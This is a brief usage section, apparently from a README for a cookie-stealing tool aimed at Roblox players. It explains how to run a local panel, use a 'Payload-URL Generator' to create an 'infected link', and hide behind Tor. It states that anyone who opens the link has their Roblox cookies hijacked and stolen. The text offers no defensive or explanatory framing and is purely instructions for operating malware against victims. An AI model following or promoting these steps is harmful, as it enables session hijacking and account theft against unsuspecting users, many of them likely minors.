### How to use?

* Open your browser. We recommend you use the Tor browser for better anonymity.
* Start the localhost page - http://127.0.0.1 
* Start pythonw and reload the page.
* Next, when you see the main menu, click on 'Payload-URL Generator' and generate an infected link.
* Wait about 1â€“2 minutes and you will receive a special link. When anyone opens it in a browser, our code hijacks and steals Roblox cookies.
